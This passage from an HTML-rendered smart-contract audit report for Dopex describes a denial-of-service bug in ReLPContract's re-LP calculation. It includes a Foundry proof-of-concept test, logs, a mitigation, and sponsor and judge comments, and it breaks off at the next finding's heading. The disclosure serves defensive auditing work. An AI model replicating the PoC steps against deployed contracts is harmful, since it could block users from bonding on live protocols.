href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1531\">0xMango</a>, <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/1172\">pep7siup</a>, and <a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/830\">0xDING99YA</a></em></p>\n<p>Possible full DoS for <code>ReLPContract</code></p>\n<h3 id=\"proof-of-concept-8\" style=\"position:relative;\"><a href=\"#proof-of-concept-8\" aria-label=\"proof of concept 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>When taking out a <code>bond</code> in <code>RdpxV2Core</code> if <code>isReLPActive == true</code>, a call to <code>ReLPContract#reLP</code> is made which ‘re-LPs the pool` (takes out an amount of RDPX, while still perfectly maintaining the token ratio of the pool).</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveA</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveB</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">UniswapV2Library</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getReserves</span><span class=\"mtk1\">(  </span><span class=\"mtk3\">// @audit - here it gets the reserves of the pool and assumes them as owned by the protocol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ammFactory</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenASorted</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenBSorted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">TokenAInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">TokenAInfo</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// get tokenA reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenAReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IRdpxReserve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenAReserve</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .</span><span class=\"mtk11\">rdpxReserve</span><span class=\"mtk1\">(); </span><span class=\"mtk3\">// rdpx reserves</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// get rdpx price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenAPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IRdpxEthOracle</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">rdpxOracle</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      .</span><span class=\"mtk11\">getRdpxPriceInEth</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenALpReserve</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenA</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">tokenASorted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      ? </span><span class=\"mtk12\">reserveA</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      : </span><span class=\"mtk12\">reserveB</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">baseReLpRatio</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">reLPFactor</span><span class=\"mtk1\"> *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sqrt</span><span class=\"mtk1\">(</span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenAReserve</span><span class=\"mtk1\">) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">) / (</span><span class=\"mtk10\">Math</span><span class=\"mtk1\">.</span><span class=\"mtk11\">sqrt</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">// 1e6 precision</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenAToRemove</span><span class=\"mtk1\"> = ((((</span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">4</span><span class=\"mtk1\">) * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenAReserve</span><span class=\"mtk1\">) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenALpReserve</span><span class=\"mtk1\"> *   </span><span class=\"mtk3\">// @audit - here the total RDPX reserve in the pool is assumed to be owned by the protocol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">baseReLpRatio</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">1e18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">DEFAULT_PRECISION</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e2</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalLpSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IUniswapV2Pair</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpToRemove</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">tokenAToRemove</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">totalLpSupply</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenALpReserve</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>The problem is that the protocol wrongfully assumes that it owns all of the liquidity within the pool. This leads to faulty calculations. In best case scenario wrong amounts are passed. However, when the protocol doesn’t own the majority of the pool LP balance, this could lead to full DoS, as <code>lpToRemove</code> will be calculated to be more than the LP balance of <code>UniV2LiquidityAmo</code> and the transaction will revert.</p>\n<p>This can all be easily proven by a simple PoC (add the test to the given <code>Periphery.t.sol</code>)\nNote: there’s an added <code>console.log</code> in <code>ReLPContract#reLP</code>, just before the <code>transferFrom</code> in order to better showcase the issue</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpToRemove</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">tokenAToRemove</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">totalLpSupply</span><span class=\"mtk1\">) /</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">tokenAInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">tokenALpReserve</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;lpToRemove value:    &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">lpToRemove</span><span class=\"mtk1\">);  </span><span class=\"mtk3\">// @audit - added console.log to prove the underflow</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// transfer LP tokens from the AMO</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">IERC20WithBurn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">).</span><span class=\"mtk11\">transferFrom</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">addresses</span><span class=\"mtk1\">.</span><span class=\"mtk12\">amo</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">lpToRemove</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testReLpContract</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">testV2Amo</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// set address in reLP contract and grant role</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">reLpContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setAddresses</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weth</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxReserveContract</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uniV2LiquidityAMO</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxPriceOracle</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">router</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">reLpContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">grantRole</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reLpContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">RDPXV2CORE_ROLE</span><span class=\"mtk1\">(), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">reLpContract</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setreLpFactor</span><span class=\"mtk1\">(</span><span class=\"mtk7\">9e4</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// add liquidity</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uniV2LiquidityAMO</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addLiquidity</span><span class=\"mtk1\">(</span><span class=\"mtk7\">5e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uniV2LiquidityAMO</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approveContractToSpend</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">pair</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">reLpContract</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk11\">type</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">).</span><span class=\"mtk12\">max</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setIsreLP</span><span class=\"mtk1\">(</span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveA</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">reserveB</span><span class=\"mtk1\">, ) = </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getReserves</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk12\">reserveB</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk12\">reserveA</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">weth</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">router</span><span class=\"mtk1\">), </span><span class=\"mtk12\">reserveB</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">router</span><span class=\"mtk1\">), </span><span class=\"mtk12\">reserveA</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">router</span><span class=\"mtk1\">.</span><span class=\"mtk11\">addLiquidity</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rdpx</span><span class=\"mtk1\">), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">weth</span><span class=\"mtk1\">), </span><span class=\"mtk12\">reserveA</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk12\">reserveB</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">2</span><span class=\"mtk1\">), </span><span class=\"mtk7\">12731316317831123</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;UniV2Amo balance isn&#39;t enough and will underflow&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pairBalance</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">pair</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uniV2LiquidityAMO</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk10\">console</span><span class=\"mtk1\">.</span><span class=\"mtk11\">log</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;UniV2Amo LP balance: &quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">pairBalance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;ds-math-sub-underflow&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">rdpxV2Core</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bond</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p>And the logs:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">[PASS] testReLpContract() (gas: 3946961)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">Logs:</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  UniV2Amo balance isn&#39;t enough and will underflow</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  UniV2Amo LP balance:  2235173550604750304</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  lpToRemove value:     17832559500122488916</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change the logic and base all calculations on the pair balance of <code>UniV2LiquidityAmo</code></p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/143#issuecomment-1733719078\">psytama (Dopex) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>The re-LP formula used is incorrect.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-08-dopex-findings/issues/143#issuecomment-1755815613\">Alex the Entreprenerd (Judge) commented</a>:</strong></p>\n<blockquote>\n<p>The incorrect assumption does indeed cause reverts.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-17\" style=\"position:relative;\"><a href=\"#medium-risk-findings-17\" aria-label=\"medium risk findings 17 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (17)</h1>\n<h2 id=\"m-01-bonding-weth-discounts-can-drain-weth-reserves-of-rdpxv2core-contract-to-zero\" style=\"position:relative;\"><a href=\"#m-01-bonding-weth-discounts-can-drain-weth-reserves-of-rdpxv2core-contract-to-zero\" aria-label=\"m 01 bonding weth discounts can drain weth reserves of rdpxv2core contract to zero permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 